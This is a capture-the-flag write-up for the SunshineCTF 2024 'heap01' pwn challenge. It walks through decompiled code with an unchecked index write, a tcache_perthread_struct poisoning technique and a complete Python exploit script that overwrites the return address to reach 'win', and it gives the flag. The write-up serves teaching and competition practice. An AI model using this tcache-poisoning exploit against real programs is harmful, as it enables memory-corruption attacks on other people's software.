# heap01
> ### Category: pwn
>
> I like big chunks and I cannot lie, big chunks make me wanna cry.
>
> This challenge is a HEAP of fun.
>
> Too bad there's only one... right?
>
> right?
>
> oh no.
>
> `nc 2024.sunshinectf.games 24006`
>
> ### Attachments
> `heap01`
> `libc.so.6`

## Overview
The code is rather straightforward:
```c
void func0(void) {
  size_t chunk_size;
  ulonglong *chunk1;
  long idx;
  ulonglong val;
  ulonglong *chunk2;
  long in_FS_OFFSET;
  undefined stack_leak [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Do you want a leak? ");
  get_inp();
  printf("%p\n",stack_leak);
  puts("Enter chunk size: ");
  chunk_size = get_inp();
  chunk1 = (ulonglong *)malloc(chunk_size);
  printf("Here you go: 0x%lx\n",chunk1[3]);
  puts("Let\'s fill that buffer up...\n");
  puts("Index: ");
  idx = get_inp();
  puts("Value: ");
  val = get_inp();
  chunk1[idx] = val;
  puts("The chunk is still hungry... let\'s fill it up some more!\n");
  puts("Index: ");
  idx = get_inp();
  puts("Value: ");
  val = get_inp();
  chunk1[idx] = val;
  chunk2 = (ulonglong *)malloc(chunk_size);
  puts("Value 1: ");
  val = get_inp();
  *chunk2 = val;
  puts("Value 2 - ");
  val = get_inp();
  chunk2[1] = val;
  puts("Value 3 -> ");
  val = get_inp();
  chunk2[2] = val;
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
The following happens:
- program provides a stack leak
- program asks for a chunk size
- program allocates a chunk of this size
- program asks for an index and an 8-byte value to write at that index 2 times; there are no checks on the value of the index, so this is an arbitrary write on an address relative to the chunk
- the program allocates a second chunk of the same size
- program overwrites first 24 bytes of the new chunk with user-supplied values

## Solution
The following method was discovered by [krloer](https://ctf.krloer.com/), I've written the script to exploit it.

Every tcache has a corresponding object of type `tcache_perthread_struct` stored on the heap, which looks as follows:
```c
typedef struct tcache_perthread_struct

{

  char counts[TCACHE_MAX_BINS];

  tcache_entry *entries[TCACHE_MAX_BINS];

} tcache_perthread_struct;
```
`counts` stores the numbers of elements in each bin and `entries` are pointers to the last elements in the corresponding bins. If the size provided to the program is a size that fits into a tcache and we find a way to overwrite the values in `tcache_perthread_struct` for the main thread, the second malloc will "allocate" a chunk at an arbitrary address - this can be used to get a chunk on the stack and to overwrite the return address of `func0` to make it return to `win`. Luckily this is very simple - the `tcache_perthread_struct` object will always be the first chunk on the heap (it's pointed to by `tcache` variable from libc), followed by a chunk which acts as a buffer for `stdin`. The offset from the first chunk allocated by `func0` to `*tcache` will be constant and can be used to calculate proper indeces that allow overwriting appropriate values of the struct.

## Script
```py
from gdb_plus import *

fname = './heap01'
e = ELF(fname, checksec=False)

dbg = Debugger(fname, script='init-gef').remote('2024.sunshinectf.games', 24006)

io = dbg.p

# dbg.b('func0+337')
dbg.c(wait=False)

io.sendlineafter(b'leak? \n', b'')
stack_leak = int(io.recvline().strip()[2:].decode(), 16) + 0x20 # this address points to old RBP value - we can't make it point directly to the return address, as then it is not aligned properly and tcache will abort the program when returning the fake chunk
log.info(f'{stack_leak = :016x}')
io.sendlineafter(b'size: \n', b'24') # 24 bytes - size of the smallest chunk in tcache

offset = 0x1aab010 - 0x1aac2b0 # offset from the 1st chunk from func0 to the tcache struct
assert offset % 8 == 0
idx1 = offset // 8 # index 1 - the number of elements in the first bin
idx2 = (offset + 128) // 8 # index 2 - the address of the last element of the first bin

log.info(f'{idx1 = }, {idx2 = }')

io.sendlineafter(b'Index: \n', f'{idx1}'.encode())
io.sendlineafter(b'Value: \n', b'1')

io.sendlineafter(b'Index: \n', f'{idx2}'.encode())
io.sendlineafter(b'Value: \n', f'{stack_leak}'.encode())

io.sendlineafter(b'Value 1: \n', b'2137') # arbitrary value
io.sendlineafter(b'Value 2 - \n', f'{e.sym["win"] + 25}'.encode()) # e.sym["win"] + 25 - skip 25 bytes - the instructions that initialise the stack frame - because otherwise the stack will be misaligned and the program will segfault
io.sendlineafter(b'Value 3 -> \n', b'2137') # arbitrary value

io.interactive()
```

## Flag
`sun{Wait, this datastructure is here? This is helpful}`